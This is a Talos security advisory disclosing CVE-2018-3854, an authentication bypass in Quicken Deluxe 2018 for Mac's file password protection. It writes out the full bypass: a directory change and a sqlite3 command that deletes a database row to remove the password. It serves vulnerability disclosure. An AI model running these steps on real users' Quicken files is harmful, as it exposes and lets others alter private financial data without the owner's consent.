# Talos Vulnerability Report

### TALOS-2018-0537

## Intuit Quicken Deluxe 2018 for Mac Password Protection Authentication Bypass Vulnerability

##### October 9, 2018

##### CVE Number

CVE-2018-3854

### Summary

An exploitable information disclosure vulnerability exists in the password protection functionality of Quicken Deluxe 2018 for Mac
version 5.2.2. A specially crafted sqlite3 request can cause the removal of the password protection, allowing an attacker
to access and modify the data without knowing the password. An attacker needs to have access to the password-protected files to
trigger this vulnerability.

### Tested Versions

Intuit Quicken Quicken Deluxe 2018 5.2.2

### Product URLs

[Quicken for Mac](https://www.quicken.com/mac/compare)

### CVSSv3 Score

7.1 - CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

### CWE

CWE-288: Authentication Bypass Using an Alternate Path or Channel

### Details

Quicken supports a password protection feature for files. This
may be enabled in Quicken from the menu by using “File,” followed
by “Set File Password.”

The vulnerability is triggered by removing a row from the SQLite
database.

The first of two bypass steps is to change to the directory that
houses the database in the Quicken data file:

```
cd '~/Library/Application Support/Quicken/Documents/filename.quicken'

```

The second step is to call a sqlite3 command to remove the table entry:

| echo delete from ZDOCUMENTPROPERTY where ZNAME is "progressMetadataRefCount" \; | sqlite3 data |
| --- | --- |

### Mitigation

Use FileVault and encrypt backups.
